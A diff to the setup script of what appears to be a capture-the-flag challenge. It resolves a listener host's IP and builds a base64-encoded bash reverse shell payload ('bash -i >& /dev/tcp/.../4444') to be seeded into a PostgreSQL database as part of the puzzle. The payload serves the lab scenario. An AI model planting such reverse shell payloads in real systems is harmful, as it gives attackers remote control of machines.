@@ -41,16 +41,18 @@ if ! runuser -u postgres -- psql -qAtc "SELECT 1 FROM pg_database WHERE datname=
 fi
 
 # --- 4. the note points at a REAL listener IP ---------------------------------
-# Resolve `entry` (the player's SSH host) on the internal network and build the
-# base64 payload exactly like the author's package does, but always working in
-# the per-instance network. Falls back to the service name if DNS is cold.
-LISTEN_IP=""
-for _ in $(seq 1 90); do
-    LISTEN_IP=$(getent hosts entry | awk 'NR==1 {print $1}')
-    [ -n "$LISTEN_IP" ] && break
+# The instancer creates containers WITHOUT network-name aliases (EndpointsConfig
+# is empty), so `getent hosts db`-style service names do not resolve anywhere.
+# Docker's embedded DNS does resolve the `Hostname` we set in the manifest, so
+# the listener is addressed as `entry-host`. Resolve it to an IP at boot so the
+# note always carries something connectable.
+LISTEN=""
+for _ in $(seq 1 45); do
+    LISTEN=$(getent hosts entry-host | awk 'NR==1 {print $1}')
+    [ -n "$LISTEN" ] && break
     sleep 2
 done
-LISTEN="${LISTEN_IP:-entry}"
+LISTEN="${LISTEN:-entry-host}"
 PAYLOAD_B64=$(printf 'bash -c "bash -i >& /dev/tcp/%s/4444 0>&1"' "$LISTEN" | base64 -w0)
 
 runuser -u postgres -- psql -qAt -d appdb <<SQL
